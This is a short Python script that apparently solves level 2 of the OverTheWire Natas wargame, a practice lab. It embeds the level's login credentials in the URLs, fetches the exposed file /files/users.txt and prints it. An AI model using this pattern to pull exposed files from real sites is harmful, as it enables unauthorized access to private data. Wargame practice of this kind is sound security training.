import requests

target = 'http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org'
target1 = 'http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/files'
target2 = 'http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/files/users.txt'
r = requests.get(target2)
if r.status_code != requests.codes.ok :
	print 'Unable to Connect'
else :
	print 'Connected'

print r.content